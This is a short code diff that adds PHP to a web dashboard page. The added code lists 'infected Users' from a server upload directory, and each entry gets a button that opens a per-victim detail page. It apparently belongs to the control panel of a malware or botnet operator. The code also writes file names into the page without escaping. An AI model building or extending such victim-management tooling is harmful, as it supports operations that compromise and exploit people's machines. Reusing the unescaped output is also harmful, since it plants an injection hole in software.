@@ -212,6 +212,19 @@
                 <div class="card-body">
                   <div class="tab-content">
                     <div class="tab-pane active" id="profile">
+                    <?php
+	                    echo "Here are our infected Users<br><br>";
+	                    $path = "/usr/share/fileupload/home/";
+	                    $dh = opendir($path);
+	                    $i=1;
+	                    while (($filename = readdir($dh)) !== false) {
+                        	if($filename != "." && $filename != ".." && $filename != "sample.php" && $filename != ".htaccess" && $filename != "error_log" && $filename != "cgi-bin") {
+                            echo "<form action='displayNode.php' method='post'><input type='hidden' name='uname' value='$filename'><button type='submit' class='btn btn-primary'><b>$filename</b></button></form><br /><br />";
+                           $i++;
+    					       	}
+				    	}
+				    	closedir($dh);
+				    ?>
                       <table class="table">
                         <tbody>
                           <tr>
